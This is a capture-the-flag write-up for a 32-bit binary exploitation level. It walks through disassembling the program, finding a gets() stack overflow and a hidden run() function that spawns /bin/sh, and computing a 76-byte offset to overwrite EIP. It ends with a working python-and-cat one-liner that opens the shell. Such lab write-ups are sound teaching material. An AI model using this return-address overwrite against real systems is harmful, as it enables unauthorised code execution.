# LEVEL 1

## 💡 Explanation

In this level we have to:
1. When launching the program `./level1` it waits for an input; by passing "aaaa" it exist without any problem but if the input is much longer it segfaults!
2. By disambling the main we see that there is a call to the function `gets` which is probably the one causing the segfault. This can easily be exploited by doing a buffer overflow and understanding where is each register saved in memory. [Here I spent HOURS looking for how to exploit the buffer overflow and pass a shellcode, but no...]
3. After the small parenthesis I've realised that when looking at what is in the binary but not in the main we discover a function `run` which is not called by the main. By looking the objdump we see that this function has a call to `system` and when looking at the hexdump we see some strings as "Good... Wait what?" and "/bin/sh".
4. We are going to try to access the function `run` by exploiting the buffer overflow that we talked about before. By having a look at the stack after calling `gets` and passing a long string of "a" (61 in hex) we will have something like this:

```
0xbffff6d0:	 <  ESP  >	0x0000002f	0xbffff72c	0xb7fd0ff4
0xbffff6e0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff6f0:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff700:	0x61616161	0x61616161	0x61616161	0x61616161
0xbffff710:	0x61616161	0x61616161	0x08048400	0xb7fd0ff4
0xbffff720:	0x080484a0	0x00000000	 <  EBP  >	 <  EIP  >
```

5. We can see that if we exceed the buffer we can write into the EIP and therefore, the program will jump to that instruction after the get; therefore, we'll have to place the address of the function `run` (/!\ little endian! 08048444 => \x44\x84\x04\x08) exactly on the EIP. To do so, we have to calculate were does the program start writing the input (0xbffff6e0) and how many bytes we have until EIP (0xbffff72c - 0xbffff6e0) which gives a total of 76 bytes.

## 👾 Commands

To find the solution:
```
[VM]  objdump -d /home/user/level1/level1
[VM]  hexdump -C /home/user/level1/level1
[GDB] disas main
[GDB] disas run
[GDB] x/24xw $esp
```

To find the flag:
- `(python -c 'print "1"*76 + "\x44\x84\x04\x08"' ; cat - ) | /home/user/level1/level1 `
